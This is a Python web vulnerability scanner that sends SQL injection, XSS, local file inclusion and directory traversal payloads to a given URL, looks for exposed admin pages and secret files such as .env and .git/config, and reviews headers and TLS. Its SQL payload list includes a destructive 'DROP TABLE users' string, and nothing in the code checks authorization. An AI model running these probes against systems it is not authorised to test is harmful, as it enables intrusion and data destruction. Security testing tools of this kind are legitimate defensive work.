import requests
import argparse
import sys
import threading
import time
import ssl
import socket
import json
import re
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging
from colorama import init, Fore, Style
import warnings
warnings.filterwarnings('ignore', message='Unverified HTTPS request')

# Initialize colorama for colored output
init()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    filename='advanced_vulnerability_scan.log'
)

class AdvancedWebScanner:
    def __init__(self, url, timeout=10, threads=10, depth=2):
        self.url = url.rstrip('/')
        self.timeout = timeout
        self.threads = threads
        self.depth = depth
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })
        self.vulnerabilities_found = 0
        self.discovered_urls = set()
        self.lock = threading.Lock()
        
        # Comprehensive vulnerability payloads
        self.sql_payloads = [
            "' OR '1'='1",
            "1; DROP TABLE users --",
            "' UNION SELECT NULL, NULL, NULL --",
            "admin'--",
            "' OR 1=1#",
            "' OR 'a'='a",
            "\") OR 1=1--",
            "'; WAITFOR DELAY '0:0:5'--",
            "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
            "' OR (SELECT SUBSTRING(@@version,1,1))='5'--"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "'-alert('XSS')-'",
            "\"><script>alert('XSS')</script>",
            "<script>prompt('XSS')</script>",
            "<img src=\"x\" onerror=\"alert('XSS')\">"
        ]
        
        self.lfi_payloads = [
            "../../../../etc/passwd",
            "../../../../windows/system32/drivers/etc/hosts",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "../../../../proc/version",
            "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
            "....//....//....//....//etc/passwd",
            "../../../../../../etc/passwd%00"
        ]

    def print_result(self, message, is_vulnerable=False, severity="INFO"):
        with self.lock:
            if is_vulnerable:
                if severity == "CRITICAL":
                    color = Fore.MAGENTA
                    prefix = "[CRITICAL]"
                elif severity == "HIGH":
                    color = Fore.RED
                    prefix = "🔴 HIGH"
                elif severity == "MEDIUM":
                    color = Fore.YELLOW
                    prefix = "🟡 MEDIUM"
                else:
                    color = Fore.CYAN
                    prefix = "🔵 LOW"
                print(f"{color}[{prefix}] {message}{Style.RESET_ALL}")
                self.vulnerabilities_found += 1
            else:
                print(f"{Fore.GREEN}[✓] {message}{Style.RESET_ALL}")
            logging.info(f"{severity}: {message}")

    def make_request(self, url, method="GET", data=None, allow_redirects=True):
        """Safe HTTP request with error handling"""
        try:
            if method.upper() == "POST":
                response = self.session.post(url, data=data, timeout=self.timeout, 
                                           allow_redirects=allow_redirects, verify=False)
            else:
                response = self.session.get(url, timeout=self.timeout, 
                                          allow_redirects=allow_redirects, verify=False)
            return response
        except requests.RequestException as e:
            logging.warning(f"Request failed for {url}: {str(e)}")
            return None

    def discover_urls(self):
        """Advanced URL discovery"""
        print(f"{Fore.CYAN}[INFO] Starting URL discovery...{Style.RESET_ALL}")
        
        # Common directories and files
        common_paths = [
            "admin", "administrator", "login", "wp-admin", "phpmyadmin",
            "backup", "backups", "config", "configuration", "logs", "log",
            "test", "testing", "dev", "development", "staging", "private",
            "uploads", "upload", "files", "file", "tmp", "temp", "cache",
            "api", "v1", "v2", "docs", "documentation", "help", "support",
            "robots.txt", "sitemap.xml", ".htaccess", "web.config", "crossdomain.xml",
            "phpinfo.php", "info.php", "test.php", "index.php~", "config.php.bak"
        ]
        
        discovered = set()
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for path in common_paths:
                test_url = urljoin(self.url, path)
                futures.append(executor.submit(self.check_url_exists, test_url))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    discovered.add(result)
        
        self.discovered_urls.update(discovered)
        print(f"{Fore.CYAN}[INFO] Discovered {len(discovered)} accessible paths{Style.RESET_ALL}")

    def check_url_exists(self, url):
        """Check if URL exists and return it if accessible"""
        response = self.make_request(url)
        if response and response.status_code in [200, 301, 302, 403]:
            return url
        return None

    def check_advanced_sql_injection(self):
        """Advanced SQL injection testing"""
        print(f"{Fore.CYAN}[INFO] Testing for SQL injection vulnerabilities...{Style.RESET_ALL}")
        
        # Common parameters to test
        test_params = ['id', 'q', 'search', 'user', 'page', 'cat', 'category', 'item', 'product']
        
        # SQL error patterns
        error_patterns = [
            r"sql syntax.*mysql",
            r"valid mysql result",
            r"mysql_fetch_array\(\)",
            r"mysql_fetch_assoc\(\)",
            r"mysql_fetch_row\(\)",
            r"mysql_num_rows\(\)",
            r"you have an error in your sql syntax",
            r"warning.*mysql_.*",
            r"valid postgresql result",
            r"warning.*pg_.*",
            r"valid oracle result",
            r"warning.*oci_.*",
            r"warning.*ora_.*",
            r"microsoft ole db provider for sql server",
            r"unclosed quotation mark after the character string",
            r"syntax error.*in query expression"
        ]
        
        found_vuln = False
        for param in test_params:
            for payload in self.sql_payloads:
                test_url = f"{self.url}?{param}={payload}"
                response = self.make_request(test_url)
                
                if response:
                    response_text = response.text.lower()
                    
                    # Check for SQL errors
                    for pattern in error_patterns:
                        if re.search(pattern, response_text, re.IGNORECASE):
                            self.print_result(
                                f"SQL Injection vulnerability detected at {test_url}",
                                True, "HIGH"
                            )
                            found_vuln = True
                            break
                    
                    # Check for time-based blind SQL injection
                    if "waitfor delay" in payload.lower():
                        start_time = time.time()
                        response = self.make_request(test_url)
                        end_time = time.time()
                        
                        if end_time - start_time > 4:  # 5 second delay minus 1 for tolerance
                            self.print_result(
                                f"Time-based SQL Injection detected at {test_url}",
                                True, "HIGH"
                            )
                            found_vuln = True
                
                if found_vuln:
                    break
            if found_vuln:
                break
        
        if not found_vuln:
            self.print_result("No SQL injection vulnerabilities found")

    def check_advanced_xss(self):
        """Advanced XSS testing including DOM-based and stored XSS"""
        print(f"{Fore.CYAN}[INFO] Testing for XSS vulnerabilities...{Style.RESET_ALL}")
        
        test_params = ['search', 'q', 'name', 'comment', 'message', 'title', 'description']
        found_vuln = False
        
        for param in test_params:
            for payload in self.xss_payloads:
                # Test reflected XSS
                test_url = f"{self.url}?{param}={payload}"
                response = self.make_request(test_url)
                
                if response and payload in response.text:
                    self.print_result(
                        f"Reflected XSS vulnerability detected at {test_url}",
                        True, "MEDIUM"
                    )
                    found_vuln = True
                
                # Test POST-based XSS
                post_data = {param: payload}
                response = self.make_request(self.url, method="POST", data=post_data)
                
                if response and payload in response.text:
                    self.print_result(
                        f"POST-based XSS vulnerability detected at {self.url}",
                        True, "MEDIUM"
                    )
                    found_vuln = True
        
        if not found_vuln:
            self.print_result("No XSS vulnerabilities found")

    def check_local_file_inclusion(self):
        """Test for Local File Inclusion vulnerabilities"""
        print(f"{Fore.CYAN}[INFO] Testing for Local File Inclusion...{Style.RESET_ALL}")
        
        test_params = ['file', 'page', 'include', 'path', 'doc', 'document', 'root', 'pg']
        found_vuln = False
        
        for param in test_params:
            for payload in self.lfi_payloads:
                test_url = f"{self.url}?{param}={payload}"
                response = self.make_request(test_url)
                
                if response:
                    content = response.text.lower()
                    
                    # Check for Linux file inclusion
                    if "root:x:" in content or "daemon:x:" in content:
                        self.print_result(
                            f"Local File Inclusion (Linux) detected at {test_url}",
                            True, "HIGH"
                        )
                        found_vuln = True
                    
                    # Check for Windows file inclusion
                    if "# this is a sample hosts file" in content:
                        self.print_result(
                            f"Local File Inclusion (Windows) detected at {test_url}",
                            True, "HIGH"
                        )
                        found_vuln = True
        
        if not found_vuln:
            self.print_result("No Local File Inclusion vulnerabilities found")

    def check_directory_traversal(self):
        """Test for directory traversal vulnerabilities"""
        print(f"{Fore.CYAN}[INFO] Testing for directory traversal...{Style.RESET_ALL}")
        
        traversal_payloads = [
            "../", "..\\", "..%2F", "..%5C", "....//", "....\\\\",
            "%2e%2e%2f", "%2e%2e%5c", "..%252f", "..%255c"
        ]
        
        directories = ["admin", "backup", "config", "logs", "private", "uploads"]
        found_vuln = False
        
        for directory in directories:
            for payload in traversal_payloads:
                test_url = urljoin(self.url, payload * 4 + directory)
                response = self.make_request(test_url)
                
                if response and response.status_code == 200:
                    if "index of" in response.text.lower():
                        self.print_result(
                            f"Directory traversal vulnerability at {test_url}",
                            True, "MEDIUM"
                        )
                        found_vuln = True
        
        if not found_vuln:
            self.print_result("No directory traversal vulnerabilities found")

    def check_security_headers(self):
        """Comprehensive security headers analysis"""
        print(f"{Fore.CYAN}[INFO] Analyzing security headers...{Style.RESET_ALL}")
        
        response = self.make_request(self.url)
        if not response:
            self.print_result("Could not fetch headers for analysis", True, "LOW")
            return
        
        headers = response.headers
        
        # Critical security headers
        critical_headers = {
            'Content-Security-Policy': "Prevents XSS and injection attacks",
            'X-Frame-Options': "Prevents clickjacking attacks",
            'X-Content-Type-Options': "Prevents MIME type sniffing",
            'Strict-Transport-Security': "Enforces HTTPS connections",
            'X-XSS-Protection': "Browser XSS filtering"
        }
        
        for header, description in critical_headers.items():
            if header not in headers:
                self.print_result(
                    f"Missing critical security header: {header} ({description})",
                    True, "MEDIUM"
                )
        
        # Check for information disclosure headers
        info_disclosure_headers = [
            'Server', 'X-Powered-By', 'X-AspNet-Version', 'X-AspNetMvc-Version'
        ]
        
        for header in info_disclosure_headers:
            if header in headers:
                self.print_result(
                    f"Information disclosure via {header}: {headers[header]}",
                    True, "LOW"
                )

    def check_ssl_configuration(self):
        """Analyze SSL/TLS configuration"""
        print(f"{Fore.CYAN}[INFO] Analyzing SSL/TLS configuration...{Style.RESET_ALL}")
        
        if not self.url.startswith('https://'):
            self.print_result("Site not using HTTPS - data transmitted in plaintext", True, "HIGH")
            return
        
        try:
            parsed_url = urlparse(self.url)
            hostname = parsed_url.hostname
            port = parsed_url.port or 443
            
            # Check SSL certificate
            context = ssl.create_default_context()
            with socket.create_connection((hostname, port), timeout=self.timeout) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    cert = ssock.getpeercert()
                    
                    # Check certificate expiration
                    not_after = cert['notAfter']
                    expiry_date = time.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                    expiry_timestamp = time.mktime(expiry_date)
                    current_timestamp = time.time()
                    
                    days_until_expiry = (expiry_timestamp - current_timestamp) / (24 * 3600)
                    
                    if days_until_expiry < 30:
                        self.print_result(
                            f"SSL certificate expires in {int(days_until_expiry)} days",
                            True, "MEDIUM"
                        )
                    
                    # Check for self-signed certificates
                    if cert['issuer'] == cert['subject']:
                        self.print_result("Self-signed SSL certificate detected", True, "MEDIUM")
                    
                    self.print_result(f"SSL certificate valid until {not_after}")
        
        except Exception as e:
            self.print_result(f"SSL analysis failed: {str(e)}", True, "LOW")

    def check_information_disclosure(self):
        """Check for information disclosure vulnerabilities"""
        print(f"{Fore.CYAN}[INFO] Testing for information disclosure...{Style.RESET_ALL}")
        
        # Check for common sensitive files
        sensitive_files = [
            "robots.txt", ".htaccess", "web.config", "crossdomain.xml",
            "phpinfo.php", "info.php", "test.php", "config.php",
            ".env", ".git/config", ".svn/entries", "backup.sql",
            "database.sql", "db_backup.sql", "admin.txt", "readme.txt"
        ]
        
        for file in sensitive_files:
            test_url = urljoin(self.url, file)
            response = self.make_request(test_url)
            
            if response and response.status_code == 200:
                content = response.text.lower()
                
                # Check for actual sensitive content
                if file == "phpinfo.php" and "php version" in content:
                    self.print_result(f"PHP information disclosure at {test_url}", True, "MEDIUM")
                elif file == ".env" and ("password" in content or "secret" in content):
                    self.print_result(f"Environment file disclosure at {test_url}", True, "HIGH")
                elif file.endswith(".sql") and ("create table" in content or "insert into" in content):
                    self.print_result(f"Database backup exposed at {test_url}", True, "HIGH")
                elif response.text.strip():  # File exists and has content
                    self.print_result(f"Sensitive file accessible: {test_url}", True, "LOW")

    def check_admin_interfaces(self):
        """Check for exposed admin interfaces"""
        print(f"{Fore.CYAN}[INFO] Checking for admin interfaces...{Style.RESET_ALL}")
        
        admin_paths = [
            "admin", "administrator", "admin.php", "admin/login",
            "wp-admin", "wp-login.php", "phpmyadmin", "adminer.php",
            "panel", "cpanel", "control", "manage", "management",
            "dashboard", "console", "admin-console"
        ]
        
        for path in admin_paths:
            test_url = urljoin(self.url, path)
            response = self.make_request(test_url)
            
            if response and response.status_code == 200:
                content = response.text.lower()
                
                # Look for login forms or admin indicators
                if any(term in content for term in ["login", "password", "username", "admin", "dashboard"]):
                    self.print_result(f"Admin interface found at {test_url}", True, "MEDIUM")

    def scan(self):
        """Run comprehensive vulnerability scan"""
        print(f"{Fore.MAGENTA}Advanced Web Vulnerability Scanner v2.0{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Target: {self.url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}Threads: {self.threads} | Timeout: {self.timeout}s{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
        
        start_time = time.time()
        
        # Run all vulnerability checks
        vulnerability_checks = [
            self.discover_urls,
            self.check_advanced_sql_injection,
            self.check_advanced_xss,
            self.check_local_file_inclusion,
            self.check_directory_traversal,
            self.check_security_headers,
            self.check_ssl_configuration,
            self.check_information_disclosure,
            self.check_admin_interfaces
        ]
        
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = [executor.submit(check) for check in vulnerability_checks]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    self.print_result(f"Error in vulnerability check: {str(e)}", True, "LOW")
        
        end_time = time.time()
        duration = round(end_time - start_time, 2)
        
        # Summary
        print(f"{Fore.CYAN}{'='*80}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Scan completed in {duration} seconds{Style.RESET_ALL}")
        
        if self.vulnerabilities_found == 0:
            print(f"{Fore.GREEN}🎉 No vulnerabilities found - Target appears secure!{Style.RESET_ALL}")
        else:
            color = Fore.RED if self.vulnerabilities_found > 5 else Fore.YELLOW
            print(f"{color}[WARNING] Total vulnerabilities found: {self.vulnerabilities_found}{Style.RESET_ALL}")
            print(f"{Fore.CYAN}💡 Review the findings above and implement appropriate fixes{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description="Advanced Web Vulnerability Scanner v2.0")
    parser.add_argument("url", help="Target URL to scan (e.g., http://example.com)")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout in seconds (default: 10)")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads (default: 10)")
    parser.add_argument("--depth", type=int, default=2, help="Crawling depth (default: 2)")
    
    args = parser.parse_args()

    # Validate URL
    if not args.url.startswith(('http://', 'https://')):
        args.url = 'http://' + args.url
    
    try:
        scanner = AdvancedWebScanner(args.url, args.timeout, args.threads, args.depth)
        scanner.scan()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scan interrupted by user{Style.RESET_ALL}")
        sys.exit(0)
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Unexpected error: {str(e)}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()
